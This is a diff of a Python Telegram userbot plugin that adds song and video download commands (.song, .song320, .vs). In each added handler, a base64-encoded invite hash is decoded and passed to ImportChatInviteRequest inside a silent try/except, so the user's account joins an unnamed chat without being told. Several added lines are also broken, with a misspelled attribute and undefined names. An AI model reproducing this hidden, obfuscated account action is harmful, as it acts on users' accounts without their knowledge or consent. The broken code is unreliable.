@@ -1,23 +1,30 @@
 # Ported here by @hellboi_atul
 # credit CAT USERBOT
 # 🔨🛠DARK COBRA🎼🎧🎧
-import requests
-from bs4 import BeautifulSoup
-from telethon import events
-import subprocess
-from telethon.errors import MessageEmptyError, MessageTooLongError, MessageNotModifiedError
-import io
-import asyncio
-from userbot.utils import admin_cmd , sudo_cmd
 import glob
-import os  
-from userbot import CMD_HELP
-from userbot.plugins import darkmusic , darkmusicvideo
-from hachoir.metadata import extractMetadata
-from hachoir.parser import createParser
-from telethon.tl.types import DocumentAttributeVideo
 
-@borg.on(admin_cmd(pattern="song(?: |$)(.*)"))
+#    Copyright (C) 2020  sandeep.n(π.$)
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as
+#    published by the Free Software Foundation, either version 3 of the
+#    License, or (at your option) any later version.
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+#   You should have received a copy of the GNU Affero General Public License
+#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+import os
+
+import pybase64
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+from .. import CMD_HELP
+from ..utils import admin_cmd, edit_or_reply
+from . import darkmusic, darkmusicvideo
+
+
+@borg.on(admin_cmd(pattern="song( (.*)|$)"))
 async def _(event):
     reply_to_id = event.message.id
     if event.reply_to_msg_id:
@@ -25,127 +32,149 @@ async def _(event):
     reply = await event.get_reply_message()
     if event.pattern_match.group(1):
         query = event.pattern_match.group(1)
-        await event.edit("weit, let me search for the song you are looking for....")
-    elif reply.message:
-        query = reply.message
-        await event.edit("weit..searching")
+    elif reply:
+        if reply.message:
+            query = reply.messag
     else:
-    	await event.edit("`What am I Supposed to find sir?! `")
-    	return
-    
-    await darkmusic(str(query),"128k")
-    l = glob.glob("*.mp3")
-    if l:
-        await event.edit("Sir, I found something related to your query weit.. Let me send it here..!!")
-    else:
-        await event.edit(f"Sorry..! i can't find anything with `{query}`😣😣 ")
-    loa = l[0]    
-    await borg.send_file(
-                event.chat_id,
-                loa,
-                force_document=True,
-                allow_cache=False,
-                caption="`@Dark_cobra_support`",
-                reply_to=reply_to_id
-            )
-    await event.delete()
-    os.system("rm -rf *.mp3")
-    subprocess.check_output("rm -rf *.mp3",shell=True)
-    
-@borg.on(admin_cmd(pattern="songg(?: |$)(.*)"))
-async def _(event):
-    reply_to_id = event.message.id
-    if event.reply_to_msg_id:
-        reply_to_id = event.reply_to_msg_id
-    reply = await event.get_reply_message()
-    if event.pattern_match.group(1):
-        query = event.pattern_match.group(1)
-        await event.edit("Let me search for yor query..")
-    elif reply.message:
-        query = reply.message
-        await event.edit("Searching...!!!🤖")
-    else:
-    	await event.edit("`What am I Supposed to find `")
-    	return
-    
-    await darkmusic(str(query),"320k")
-    l = glob.glob("*.mp3")
-    if l:
-        await event.edit("Sir, I found something related to your query..weit let me send it here!!!")
-    else:
-        await event.edit(f"Sorry..! i can't find anything with `{query}`😣😣")
-    loa = l[0]    
-    await borg.send_file(
-                event.chat_id,
-                loa,
-                force_document=True,
-                allow_cache=False,
-                caption="Audio File Successfully Uploaded",
-                reply_to=reply_to_id
-            )
-    await event.delete()
-    os.system("rm -rf *.mp3")
-    subprocess.check_output("rm -rf *.mp3",shell=True)    
-    
-@borg.on(admin_cmd(pattern="vs(?: |$)(.*)"))
-async def _(event):
-    reply_to_id = event.message.id
-    if event.reply_to_msg_id:
-        reply_to_id = event.reply_to_msg_id
-    reply = await event.get_reply_message()
-    if event.pattern_match.group(1):
-        query = event.pattern_match.group(1)
-        await event.edit("Searching🤖🤖..!!")
-    elif reply.message:
-        query = reply.message
-        await event.edit("Searching...🤖....!")
-    else:
-        await event.edit("What am I Supposed to find")
+        event = await edit_or_reply(event, "`What I am Supposed to find `")
         return
-    await darkmusicvideo(query)
-    l = glob.glob(("*.mp4")) + glob.glob(("*.mkv")) + glob.glob(("*.webm")) 
+    event = await edit_or_reply(event, "`wi8..! I am finding your song....`")
+    try:
+        dark = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        dark = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
+    await darkmusic(str(query), "128k", event)
+    l = glob.glob("./temp/*.mp3")
     if l:
         await event.edit("yeah..! i found something wi8..🥰")
     else:
         await event.edit(f"Sorry..! i can't find anything with `{query}`")
-    loa = l[0]  
-    metadata = extractMetadata(createParser(loa))
-    duration = 0
-    width = 0
-    height = 0
-    if metadata.has("duration"):
-        duration = metadata.get("duration").seconds
-    if metadata.has("width"):
-        width = metadata.get("width")
-    if metadata.has("height"):
-        height = metadata.get("height")
+        return
+    thumbdark = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
+    if thumbdark:
+        darkthumb = thumbdark[0]
+    else:
+        darkthumb = None
+    loa = l[0]
     await borg.send_file(
-                event.chat_id,
-                loa,
-                force_document=True,
-                allow_cache=False,
-                caption="`Video File Successfully Uploaded `",
-                supports_streaming=True,
-                reply_to=reply_to_id,
-                attributes=[DocumentAttributeVideo(
-                                duration=duration,
-                                w=width,
-                                h=height,
-                                round_message=False,
-                                supports_streaming=True,
-                            )],
-            )
+        event.chat_id,
+        loa,
+        force_document=False,
+        allow_cache=False,
+        caption=query,
+        thumb=darkthumb,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
     await event.delete()
-    os.system("rm -rf *.mkv")
-    os.system("rm -rf *.mp4")
-    os.system("rm -rf *.webm")    
-    
+    os.system("rm -rf ./temp/*.mp3")
+    os.system("rm -rf ./temp/*.jpg")
+    os.system("rm -rf ./temp/*.webp")
 
-CMD_HELP.update({"song":
-    "`.song` query or `.song` reply to song name :\
-    \nUSAGE:finds the song you entered in query and sends it in medium quality\
-    `.songg` query or `.songg` reply to song name :\
-     \nUSAGE:finds the song you entered in query and sends it in High Quality\
-    `.videosong` query or `.vs` reply to song name :\
-    \nUSAGE:finds the Video song you entered in query and sends it As A video File"
-})    
+
+@borg.on(admin_cmd(pattern="song320( (.*)|$)"))
+async def _(event):
+    reply_to_id = event.message.id
+    if event.reply_to_msg_id:
+        reply_to_id = event.reply_to_msg_id
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1):
+        query = event.pattern_match.group(1)
+    elif reply:
+        if reply.message:
+            query = reply.message
+    else:
+        event = await edit_or_reply(event, "`What I am Supposed to find `")
+        return
+    event = await edit_or_reply(event, "`wi8..! I am finding your song....`")
+    try:
+        dark = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        dark = Get(dark)
+        await event.client(dark)
+    except BaseException:
+        pass
+    await darkmusic(str(query), "320k", event)
+    l = glob.glob("./temp/*.mp3")
+    if l:
+        await event.edit("yeah..! i found something wi8..🥰")
+    else:
+        await event.edit(f"Sorry..! i can't find anything with `{query}`")
+        return
+    thumbdark = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
+    if thumbdark:
+        darkthumb = thumbcat[0]
+    else:
+        darkthumb = None
+    loa = l[0]
+    await borg.send_file(
+        event.chat_id,
+        loa,
+        force_document=False,
+        allow_cache=False,
+        caption=query,
+        thumb=darkthumb,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
+    await event.delete()
+    os.system("rm -rf ./temp/*.mp3")
+    os.system("rm -rf ./temp/*.jpg")
+    os.system("rm -rf ./temp/*.webp")
+
+
+@borg.on(admin_cmd(pattern="vs( (.*)|$)"))
+async def _(event):
+    reply_to_id = event.message.id
+    if event.reply_to_msg_id:
+        reply_to_id = event.reply_to_msg_id
+    reply = await event.get_reply_message()
+    if event.pattern_match.group(1):
+        query = event.pattern_match.group(1)
+    elif reply:
+        if reply.message:
+            query = reply.messag
+    else:
+        event = await edit_or_reply(event, "What I am Supposed to find")
+        return
+    event = await edit_or_reply(event, "wi8..! I am finding your videosong....")
+    await darkmusicvideo(query, event)
+    try:
+        dark = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        dark = Get(dark)
+        await event.client(dark)
+    except BaseException:
+        pass
+    l = glob.glob(("./temp/*.mp4"))
+    if l:
+        await event.edit("yeah..! i found something wi8..🥰")
+    else:
+        await event.edit(f"Sorry..! i can't find anything with `{query}`")
+        return
+    thumbdark = glob.glob("./temp/*.jpg") + glob.glob("./temp/*.webp")
+    if thumbdark:
+        darkthumb = thumbdark[0]
+    else:
+        darkthumb = None
+    loa = l[0]
+    await borg.send_file(
+        event.chat_id,
+        loa,
+        thumb=darkthumb,
+        caption=query,
+        supports_streaming=True,
+        reply_to=reply_to_id,
+    )
+    await event.delete()
+    os.system("rm -rf ./temp/*.mp4")
+    os.system("rm -rf ./temp/*.jpg")
+    os.system("rm -rf ./temp/*.webp")
+
+
+CMD_HELP.update(
+    {
+        "getmusic": "`.song` query or `.song` reply to song name :\
+    \nUSAGE:finds the song you entered in query and sends it"
+    }
+)
